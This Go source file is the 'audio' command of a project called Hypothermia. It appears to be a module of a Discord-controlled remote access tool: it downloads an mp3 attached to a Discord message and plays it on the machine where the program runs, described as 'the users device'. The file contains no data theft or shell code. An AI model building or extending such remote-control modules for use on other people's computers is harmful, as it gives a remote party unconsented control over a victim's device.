package commands

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"Hypothermia/src/utils"

	"github.com/bwmarrin/discordgo"
	"github.com/hajimehoshi/go-mp3"
	"github.com/hajimehoshi/oto"
)

const (
	audioNoFileError   string = "🟥 You need reply to a file."
	audioOpenFileError string = "🟥 Failed to  open file."
	audioDecodeError   string = "🟥 Failed to decode file."
	audioContextError  string = "🟥 Failed to create audio context."
	audioReadError     string = "🟥 Failed to read audio data."
	audioWriteError    string = "🟥 Failed to write audio data."

	audioSuccess string = "🟩 Successfully played audio."
)

var (
	context *oto.Context
	inited  bool = false
)

func (*AudioCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if m.MessageReference == nil {
		s.ChannelMessageSendReply(m.ChannelID, audioNoFileError, m.Reference())
		return
	}

	var fileURL string
	msg, _ := s.ChannelMessage(m.MessageReference.ChannelID, m.MessageReference.MessageID)

	for _, attachment := range msg.Attachments {
		ext := strings.ToLower(filepath.Ext(attachment.Filename))

		if ext == ".mp3" || ext == ".wav" || ext == ".m4a" {
			fileURL = attachment.URL
			break
		}
	}

	if fileURL == "" {
		s.ChannelMessageSendReply(m.ChannelID, audioNoFileError, m.Reference())
		return
	}

	path, err := utils.DonwloadFile(fileURL, "")
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprint(err), m.Reference())
		return
	}

	file, err := os.Open(path)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, audioOpenFileError, m.Reference())
		return
	}

	defer file.Close()

	decoder, err := mp3.NewDecoder(file)
	if err != nil {
		s.ChannelMessageSendReply(m.ChannelID, audioDecodeError, m.Reference())
		return
	}

	if !inited {
		context, err = oto.NewContext(decoder.SampleRate(), 2, 2, 8192)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, audioContextError, m.Reference())
			return
		}

		inited = true
	}

	player := context.NewPlayer()
	defer player.Close()

	buf := make([]byte, 4096)
	for {
		n, err := decoder.Read(buf)
		if err == io.EOF {
			break
		}

		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, audioReadError, m.Reference())
			return
		}

		_, err = player.Write(buf[:n])
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, audioWriteError, m.Reference())
			return
		}
	}

	s.ChannelMessageSendReply(m.ChannelID, audioSuccess, m.Reference())
}

func (*AudioCommand) Name() string {
	return "audio"
}

func (*AudioCommand) Info() string {
	return "plays a audio on the users device"
}

type AudioCommand struct{}
